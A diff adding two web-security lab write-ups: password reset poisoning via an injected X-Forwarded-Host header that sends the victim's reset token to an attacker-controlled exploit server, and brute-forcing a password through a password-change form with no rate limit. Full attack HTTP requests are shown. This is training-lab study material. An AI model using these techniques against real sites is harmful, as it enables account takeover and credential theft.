@@ -94,3 +94,123 @@ Trying to login with the new `carlos:peter` creds and:
 
 Looks like our hypothesis was correct , but that's not a good thing lol.
 
+## Lab: Password reset poisoning via middleware
+
+We are provided with our test credentials `wiener:peter` and our target account `carlos`. The lab being a password reset lab , we go straight to testing the password reset functionality.
+
+To learn how it works we first try it with our test account since we have access to email client for said account.
+
+![](images/wiener_login.png)
+
+Sends the Following Request:
+
+```http
+POST /forgot-password HTTP/2
+Host: 0af2001d034e21238043531700cb001d.web-security-academy.net
+Cookie: session=EG95qOPrcVG8yJOBuXNRuGpz25lr2XnO
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+Origin: https://0af2001d034e21238043531700cb001d.web-security-academy.net
+
+username=wiener
+```
+
+When we check our email we find the link with a unique token , typical of password reset links , not guessable as well.
+
+### A little Research into password reset poisoning via middleware
+
+This occurs when a web application Uses headers such as `X-Forwarded-Host` supplied by the user to dynamically generate reset urls. The `XHF` is a header used to identify the original host requested by the client in the `Host` HTTP request header. Adding the `XHF` header helps the backend to produce correct absolute urls.
+
+### Exploiting
+
+We have access to a exploit server which also has access logs. In this type of attack , the site replaces the site's name in the link sent with the value of the `XHF` header which is our exploit server url .For example , if we were to do the process normally , the link we would get would be:
+`https://site.com/forgot-password?temp-forgot-password-token=<token>` 
+
+but  due to the attack the link would look like:
+`https://attacker.com/forgot-password?temp-forgot-password-token=<token>` 
+
+Lets send the malicious request on our own account first:
+
+```http
+POST /forgot-password HTTP/2
+Host: 0af2001d034e21238043531700cb001d.web-security-academy.net
+X-Forwarded-Host: exploit-0a8200c9033d21a180e1523501b10057.exploit-server.net/exploit
+Cookie: session=EG95qOPrcVG8yJOBuXNRuGpz25lr2XnO
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+
+
+username=wiener
+```
+
+Checking our Email Client:
+
+![](images/email_check.png)
+
+After Clicking the link , We check our access logs of our exploit server:
+
+![](images/access_log.png)
+
+And there we get the reset link with a valid token , now you only need to append this to our target site and we'll be able to reset the link.
+
+### Targeting Carlos
+
+Replace `wiener` with `carlos` in the malicious post request:
+
+```http
+POST /forgot-password HTTP/2
+Host: 0af2001d034e21238043531700cb001d.web-security-academy.net
+X-Forwarded-Host: exploit-0a8200c9033d21a180e1523501b10057.exploit-server.net/exploit
+Cookie: session=EG95qOPrcVG8yJOBuXNRuGpz25lr2XnO
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 17
+
+
+username=carlos
+```
+
+Since according to the challenge description , `he user carlos will carelessly click on any links in emails that he receives` , we can just go straight and check the server access logs , get his reset link and reset the account.
+
+![](images/Reset_poisoning.png)
+
+## Lab: Password brute-force via password change
+
+After logging in with our test credentials , we see the password change functionality:
+
+![](images/pass_change_func.png)
+
+We need to provide the current correct password and matching new passwords in order to successfully change the passwords.
+
+Playing around with it , I noticed some interesting things:
+- If you provide the wrong current password , you're logged out automatically.
+- If the current password is correct but the new passwords don't match , you get an error `New Passwords do not match` . This provides a bruteforce avenue.
+Inspecting the POST request for this we see that the username is included in the request as well:
+
+```http
+POST /my-account/change-password HTTP/2
+Host: 0ad0007e04e0fbf481b53eda00610050.web-security-academy.net
+Cookie: session=p4ELHWPNcdLJwgZ4QUWSN23tBONpJb3Y; session=xC4DxSNJZnAec8vfy4BEQrTM7BRLLtVo
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 76
+
+username=wiener&current-password=peter&new-password-1=123&new-password-2=123
+```
+
+If you try and change the username from `wiener` to `carlos` . You get a new error `Current password is incorrect`  and there is no rate limit in place as well. All these combine to form the perfect opportunity for bruteforcing the password . Send to intruder , add current password as position , switch username to carlos , and filter using error.
+
+![](images/pass_change_brute.png)
